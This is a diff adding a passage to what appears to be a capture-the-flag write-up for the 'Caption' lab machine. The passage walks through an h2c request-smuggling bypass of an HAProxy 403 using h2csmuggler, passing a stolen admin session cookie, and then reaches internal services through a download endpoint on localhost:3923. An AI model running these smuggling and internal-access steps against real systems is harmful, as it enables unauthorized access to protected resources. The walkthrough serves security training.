@@ -586,3 +586,81 @@ The `/firewalls` endpoint has the same content.
 ## Smuggling Attack:
 
 <br />
+
+Searching for ways to bypass a 403 forbidden in the context of `HAProxy`, we found one great [POC](https://bishopfox.com/tools/h2c-smuggling) written by `BigShopFox` that explains how we can bypass a forbidden using the `UPGRADE` HTTP  header.
+
+To simplify the exploitation of this vulnerability, we will use the following [GitHub Repository](https://github.com/BishopFox/h2csmuggler).
+
+First step, is to verify if our target is vulnerable. We can do it running this oneliner:
+
+<br />
+
+```bash
+❯ python3 h2csmuggler.py -x http://caption.htb --test
+[INFO] h2c stream established successfully.
+[INFO] Success! http://caption.htb can be used for tunneling
+```
+
+<br />
+
+The target is vulnerable. 
+
+Next, we're going to read the `logs` directory via this technique:
+
+- NOTE: Important to include the admin cookies in our onliner.
+
+<br />
+
+```bash
+❯ python3 h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
+...[snip]...
+  <header class="container my-4">
+    <div class="row">
+      <!-- vai ocupar todo o espaço se a tela for pequena -->
+      <!-- col-lg-6 para telas grandes -->
+      
+        <center><h1>Log Management</h1></center>
+        <br/><br/><center>
+        <ul>
+            <li><a href="/download?url=http://127.0.0.1:3923/ssh_logs">SSH Logs</a></li>
+            <li><a href="/download?url=http://127.0.0.1:3923/fw_logs">Firewall Logs</a></li>
+            <li><a href="/download?url=http://127.0.0.1:3923/zk_logs">Zookeeper Logs</a></li>
+            <li><a href="/download?url=http://127.0.0.1:3923/hadoop_logs">Hadoop Logs</a></li>
+        </ul></center>
+      </div>
+    </div>
+  </header>
+...[snip]...
+```
+
+<br />
+
+There are three urls related to the `/download` endpoint poiting to log files.
+
+We can use the bypass technique to access them but we don't found nothing relevant.
+
+Another thing that we can do is to enumerate the root of this server:
+
+<br />
+
+```bash
+❯ python3 h2csmuggler.py -x http://caption.htb 'http://caption.htb/download?url=http://localhost:3923/' -H "Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzUxMzE1MjgxfQ.mvCRs4piEnvcTrPfVV8aCrDrQBw2yNLyZPco8eXzNoc"
+...[snip]...
+		document.documentElement.className = localStorage.theme || dtheme;
+	</script>
+	<script src="/.cpr/util.js?_=YrpB"></script>
+	<script src="/.cpr/baguettebox.js?_=YrpB"></script>
+	<script src="/.cpr/browser.js?_=YrpB"></script>
+	<script src="/.cpr/up2k.js?_=YrpB"></script>
+</body>
+
+</html>
+```
+
+<br />
+
+The important information is at the end of the output.
+
+## Copyparty 1.8.2 LFI (Local File Inclusion):
+
+<br />
